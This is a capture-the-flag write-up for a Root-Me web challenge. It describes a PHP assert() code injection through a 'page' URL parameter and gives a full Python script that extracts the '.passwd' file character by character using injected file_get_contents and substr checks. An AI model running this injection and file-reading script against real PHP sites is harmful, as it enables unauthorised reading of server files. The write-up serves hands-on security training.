Look at the URL: http://challenge01.root-me.org/web-serveur/ch47/?page=about, we can immediately see where the vulnerable point is. It's "page" parameter. Try add single quotation in tail of this, errors show up. We now can determine a part of code be like "assert code on line 1 Catchable fatal error: assert(): Failure evaluating code: strpos('includes/a'.php', '..') === false". So they use assert() and strpos() in this website. 
Try some dig on these functions, we know that assert() is used to Checks if assertion is FALSE, it mean if we can inject into "assertion" (in this case, assertion is entered from "page"), we can use boolean signal to read arbitrary files on server. All we need is using properly php functions. In this case, I chose substring() and file_get_contents() to get the flag file.
Write a small script to automatically extract one by one singe character of ".passwd"
And Here is my code:
```
import requests
import urllib
import string
import time

my_dic = string.letters + string.digits + " _-{}"
my_flag = ""
url = "http://challenge01.root-me.org/web-serveur/ch47/?page="

for l in range (1000):
	payload = "','vinamilk') === false && strlen(file_get_contents('.passwd')) == %d && strpos('1" % (l)
	r = requests.get(url + urllib.quote_plus(payload))
	if not r.text.find("Detected hacking attempt") > 0:
		print "length of file: %d" % (l)
		length = l
		break
	else:
		print "tried %d" % (l)

for pos in range(length):
	for fuzz in my_dic:
		payload = "','vinamilk') === false && (substr(file_get_contents('.passwd'),%d,1) == '%s') && strpos('1" % (pos, fuzz)
		r = requests.get(url + urllib.quote_plus(payload))
		if not r.text.find("Detected hacking attempt") > 0:
			my_flag = my_flag + fuzz
			print my_flag
			break
		else:
			print "tried %s" % (fuzz)
print my_flag
```